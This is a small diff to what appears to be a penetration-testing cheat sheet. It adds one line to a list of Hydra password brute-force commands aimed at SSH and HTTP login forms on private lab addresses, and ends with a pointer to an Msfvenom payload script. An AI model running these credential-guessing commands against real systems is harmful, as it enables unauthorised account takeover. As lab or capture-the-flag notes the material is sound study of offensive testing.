@@ -7,6 +7,7 @@ HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Password
   Proxy is used with Burp Suite; -C is pass list username:password; -vV is Verbose
   hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
   hydra -l floris -P /usr/share/wordlists/rockyou.txt 10.10.10.150 http-post "/index.php:username=^USER^&passwd=^PASS^&Login:Warning"
+  hydra -l admin -P /opt/seclist/rockyout.txt 10.10.110.10 <http-post|http-get> /URI
 
 Msfvenom
   https://github.com/g0tmi1k/msfpc (G0tmi1k msfvenom script)
